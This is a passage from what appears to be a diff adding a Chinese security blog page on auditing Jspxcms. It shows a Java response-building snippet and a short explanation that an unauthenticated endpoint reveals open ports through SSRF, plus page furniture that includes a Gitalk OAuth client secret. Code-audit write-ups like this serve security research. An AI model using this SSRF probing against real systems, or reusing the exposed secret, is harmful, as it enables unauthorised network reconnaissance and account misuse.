      result.<span class="title function_">append</span>(<span class="string">&quot;\&quot;url\&quot;:\&quot;&quot;</span>).<span class="title function_">append</span>(url).<span class="title function_">append</span>(<span class="string">&quot;\&quot;,&quot;</span>);</span><br><span class="line">        result.<span class="title function_">append</span>(<span class="string">&quot;\&quot;source\&quot;:\&quot;&quot;</span>).<span class="title function_">append</span>(src).<span class="title function_">append</span>(<span class="string">&quot;\&quot;&#125;,&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.<span class="title function_">charAt</span>(result.<span class="title function_">length</span>() - <span class="number">1</span>) == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        result.<span class="title function_">setLength</span>(result.<span class="title function_">length</span>() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result.<span class="title function_">append</span>(<span class="string">&quot;]&#125;&quot;</span>);</span><br><span class="line">    logger.<span class="title function_">debug</span>(result.<span class="title function_">toString</span>());</span><br><span class="line">    response.<span class="title function_">getWriter</span>().<span class="title function_">print</span>(result.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看该方法的使用情况，发现存在两处调用，选择一个前台不用被鉴权的方法进行查看。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/25.png"></p>
+<p>通过判断逻辑构造请求，可以发现当端口未开放时则返回500，当端口开放时则返回SUCCESS。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/26.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io">_0xf4n9x_</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io/jspxcms-code-audit-learn.html">https://0xf4n9x.github.io/jspxcms-code-audit-learn.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。未经许可禁止转载到微信公众号，其他转载请注明来自 <a href="https://0xf4n9x.github.io" target="_blank">_0xf4n9x_'s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/code-audit/">code-audit</a></div><div class="post_share"><div class="social-share" data-image="/img/post/jspxcms-code-audit-learn/3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/xspeeder-dologinout-rce.html" title="同迅神行者路由doLoginOut未授权RCE"><img class="cover" src="/img/post/xspeeder-dologinout-rce/5.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">同迅神行者路由doLoginOut未授权RCE</div></div></a></div><div class="next-post pull-right"><a href="/cve-2021-44228-log4j2-jndi-attack.html" title="CVE-2021-44228 Log4j2 JNDI注入漏洞"><img class="cover" src="/img/post/cve-2021-44228-log4j2-jndi-attack/0.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2021-44228 Log4j2 JNDI注入漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html" title="CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析"><img class="cover" src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/burp.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-07</div><div class="title">CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析</div></div></a></div><div><a href="/attacking-shiro-with-tomcat-memshell.html" title="利用Tomcat内存马攻击Shiro应用"><img class="cover" src="/img/post/attacking-shiro-with-tomcat-memshell/4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">利用Tomcat内存马攻击Shiro应用</div></div></a></div><div><a href="/apache-shiro-deserialization-exploitation.html" title="Apache Shiro各版本反序列化漏洞利用"><img class="cover" src="/img/post/apache-shiro-deserialization-exploitation/2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-22</div><div class="title">Apache Shiro各版本反序列化漏洞利用</div></div></a></div><div><a href="/attacking-shiro550-with-commons-collections.html" title="利用Commons Collections攻击Shiro550"><img class="cover" src="/img/post/attacking-shiro550-with-commons-collections/17.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">利用Commons Collections攻击Shiro550</div></div></a></div><div><a href="/cdg-xstream-deserialization-arbitrary-file-upload.html" title="亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞"><img class="cover" src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-05</div><div class="title">亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞</div></div></a></div><div><a href="/cve-2016-4437-apache-shiro-rce.html" title="CVE-2016-4437 SHIRO-550反序列化漏洞"><img class="cover" src="/img/post/cve-2016-4437-apache-shiro-rce/9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-21</div><div class="title">CVE-2016-4437 SHIRO-550反序列化漏洞</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%8A%80%E6%9C%AF%E6%A0%88"><span class="toc-text">0x00 技术栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%BB%84%E4%BB%B6%E4%BE%9D%E8%B5%96"><span class="toc-text">0x01 组件依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%8A%9F%E8%83%BD%E7%82%B9%E7%86%9F%E6%82%89"><span class="toc-text">0x02 功能点熟悉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E9%BB%98%E8%AE%A4%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">0x03 默认不安全配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-RCE"><span class="toc-text">0x04 RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">Shiro 721反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Zip-Slip%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">Zip Slip任意文件覆盖漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Freemarker-SSTI"><span class="toc-text">Freemarker SSTI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-XSS"><span class="toc-text">0x05 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-SSRF"><span class="toc-text">0x06 SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpClient-execute"><span class="toc-text">HttpClient.execute()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-openConnection"><span class="toc-text">URL.openConnection()</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/post/jspxcms-code-audit-learn/3.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By _0xf4n9x_</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: '127fd27133c8e286cff8',
+      clientSecret: 'f87b94b8813bcdae62b09baa633f85ef1a78107f',
+      repo: '0xf4n9x.github.io',
+      owner: '0xf4n9x',
+      admin: ['0xf4n9x'],
+      id: '92871df65a3c6dfec9ddd2aa72bd6aee',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.textContent= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !false) {
+  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-YRH7DCY1TL', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
